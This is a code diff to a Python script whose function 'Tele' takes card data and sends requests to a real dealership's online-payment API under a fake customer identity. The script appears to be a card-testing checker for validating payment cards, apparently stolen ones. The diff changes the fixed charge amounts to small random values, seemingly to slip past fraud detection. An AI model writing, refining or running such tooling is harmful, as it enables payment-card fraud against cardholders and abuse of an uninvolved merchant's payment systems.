@@ -10,6 +10,9 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 
+	random_amount1 = random.randint(1, 9)
+	random_amount2 = random.randint(1, 99)
+
 	headers = {
 	    'authority': 'www.penfold.com.au',
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -46,7 +49,7 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = '{"lead":{"dealership_slug":"559","website_slug":"penfold","url":"https://www.penfold.com.au/online-payment","source":"Website","user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36","invoice_reference":"1","name":"Rodam User","amount":"10","email":"rodamuser08@gmail.com","phone":"6148 008 945","leadStatus":"Incomplete","form_completed":false,"category":"General Enquiry","subcategory":"Incomplete Payment","visited_pages":["/online-payment"],"linked_query_params":{}}}'
+	data = '{"lead":{"dealership_slug":"559","website_slug":"penfold","url":"https://www.penfold.com.au/online-payment","source":"Website","user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36","invoice_reference":"1","name":"Rodam User","amount":"'+str(random_amount1)+'.'+str(random_amount2)+'","email":"rodamuser08@gmail.com","phone":"6148 008 945","leadStatus":"Incomplete","form_completed":false,"category":"General Enquiry","subcategory":"Incomplete Payment","visited_pages":["/online-payment"],"linked_query_params":{}}}'
 	
 	response = requests.post('https://www.penfold.com.au/api/leads', headers=headers, data=data)
 	
@@ -104,7 +107,7 @@ def Tele(ccx):
 	
 	json_data = {
 	    'dealership_slug': '559',
-	    'custom_amount': '1',
+	    'custom_amount': ''+str(random_amount1)+'.'+str(random_amount2)+'',
 	    'customer': {
 	        'email': 'rodamuser08@gmail.com',
 	    },
